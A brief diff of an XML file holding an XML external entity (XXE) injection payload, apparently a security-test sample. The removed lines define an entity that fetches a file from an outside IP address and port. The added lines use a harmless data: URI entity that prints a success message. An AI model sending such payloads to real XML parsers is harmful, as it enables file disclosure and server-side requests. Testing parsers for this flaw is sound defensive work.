@@ -1,7 +1,9 @@
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
-    <!ENTITY file SYSTEM "128.199.233.77:5001/landing_page.html.php">
+    <!ENTITY xxe SYSTEM "data:text/plain,XXE injection successful!">
 ]>
-<data>
-    &file;
-</data>
+<container>
+    <data>
+        &xxe;
+    </data>
+</container>
